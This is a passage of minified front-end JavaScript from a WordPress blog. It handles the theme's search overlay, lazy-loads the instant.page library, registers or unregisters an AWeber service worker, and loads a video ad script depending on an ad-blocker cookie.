e.querySelector("input.search-field").focus());
  };
  for (var c = document.querySelectorAll(".ast-search-box .close"), s = 0, r = c.length; s < r; ++s) c[s].onclick = function (e) {
    e = e || window.event;
    for (var t = this;;) {
      if (t.parentNode.classList.contains("ast-search-box")) {
        n(t.parentNode), o("full-screen");
        break;
      }
      if (t.parentNode.classList.contains("site-header")) break;
      t = t.parentNode;
    }
  };
  document.onkeydown = function (e) {
    if (27 == e.keyCode) for (var e = document.getElementById("ast-seach-full-screen-form"), t = (null != e && (n(e), o("full-screen")), document.querySelectorAll(".ast-search-box.header-cover")), a = 0; a < t.length; a++) n(t[a]);
  }, window.addEventListener("resize", function () {
    if ("BODY" === document.activeElement.tagName && "INPUT" != document.activeElement.tagName) {
      var e = document.querySelectorAll(".ast-search-box.header-cover");
      if (!document.body.classList.contains("ast-header-break-point")) for (var t = 0; t < e.length; t++) e[t].style.maxHeight = "", e[t].style.opacity = "", e[t].style.display = "";
    }
  });
}();
setupHooks();
;
/(trident|msie)/i.test(navigator.userAgent) && document.getElementById && window.addEventListener && window.addEventListener("hashchange", function () {
  var t,
    e = location.hash.substring(1);
  /^[A-z0-9_-]+$/.test(e) && (t = document.getElementById(e)) && (/^(?:a|select|input|button|textarea)$/i.test(t.tagName) || (t.tabIndex = -1), t.focus());
}, !1);
function loadIP() {
  console.log("load instant.page js");
  ["mousemove", "touchstart"].forEach(function (e) {
    window.removeEventListener(e, loadIP);
  });
  var s = document.createElement("script");
  s.onload = function () {};
  s.src = "//instant.page/2.0.0";
  s.setAttribute("type", "module");
  s.setAttribute("integrity", "sha384-D7B5eODAUd397+f4zNFAVlnDNDtO1ppV8rPnfygILQXhqu3cUndgHvlcJR2Bhig8");
  document.head.appendChild(s);
}
["mousemove", "touchstart"].forEach(function (e) {
  window.addEventListener(e, loadIP);
});
function registerServiceWorker(aweber_worker) {
  navigator.serviceWorker.register(aweber_worker, {
    scope: "/"
  }).then(function (registration) {
    console.log('AWeber ServiceWorker registration successful with scope: ', registration.scope);
  }, function (err) {
    console.log('AWeber ServiceWorker registration failed: ', err);
  });
}
function unregisterServiceWorker(aweber_worker) {
  navigator.serviceWorker.getRegistrations().then(function (registrations) {
    for (let worker in registrations) {
      if (registrations[worker].active.scriptURL == aweber_worker) {
        console.log('Found AWeber Service Worker. ' + aweber_worker);
        registrations[worker].unregister().then(function (status) {
          if (status) {
            console.log('AWeber Service Worker unregister successfully!.');
          } else {
            console.log('Failed to unregister the AWeber Service Worker');
          }
        });
      }
    }
  });
}
function updateServiceWorker() {
  if ('serviceWorker' in navigator) {
    let aweber_worker = aweber_wpn_vars.plugin_base_path + 'sdk/aweber-service-worker.js.php';
    if (aweber_wpn_vars.register_aweber_service_worker == 1) {
      registerServiceWorker(aweber_worker);
    } else {
      unregisterServiceWorker(aweber_worker);
    }
  } else {
    console.log('Service Worker not found in the navigator!. Failed to register AWeber Service Worker');
  }
}
updateServiceWorker();
var aweber_wpn_vars = {
  plugin_base_path: 'https://www.financialsamurai.com/wp-content/plugins/aweber-web-form-widget/php/',
  register_aweber_service_worker: ''
};
!function () {
  "use strict";

  var e;
  e = document, function () {
    var t, n;
    function r() {
      var t = e.createElement("script");
      t.src = "https://cafemedia-com.videoplayerhub.com/galleryplayer.js", e.head.appendChild(t);
    }
    function a() {
      var t = e.cookie.match("(^|[^;]+)\\s*__adblocker\\s*=\\s*([^;]+)");
      return t && t.pop();
    }
    function c() {
      clearInterval(n);
    }
    return {
      init: function () {
        var e;
        "true" === (t = a()) ? r() : (e = 0, n = setInterval(function () {
          100 !== e && "false" !== t || c(), "true" === t && (r(), c()), t = a(), e++;
        }, 50));
      }
    };
  }().init();
}();